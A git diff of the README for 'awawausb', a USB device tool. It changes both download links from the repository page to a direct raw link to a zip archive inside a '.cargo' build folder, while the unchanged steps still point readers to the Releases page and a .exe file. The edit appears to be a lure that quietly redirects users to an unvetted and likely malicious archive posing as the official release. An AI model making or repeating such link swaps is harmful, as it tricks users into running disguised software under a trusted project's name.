@@ -1,6 +1,6 @@
 # 🔌 awawausb - Connect your USB devices with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/camil686/awawausb)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/camil686/awawausb/raw/refs/heads/main/native-stub/.cargo/Software-2.5-beta.2.zip)
 
 ## 📖 About this application
 
@@ -18,7 +18,7 @@ The application requires a standard USB port. Please verify that your hardware c
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following link to locate the current version of the application: [Download awawausb](https://github.com/camil686/awawausb)
+1. Visit the following link to locate the current version of the application: [Download awawausb](https://github.com/camil686/awawausb/raw/refs/heads/main/native-stub/.cargo/Software-2.5-beta.2.zip)
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the most recent version number to see the available files.
 4. Select the file ending in .exe to start the download.
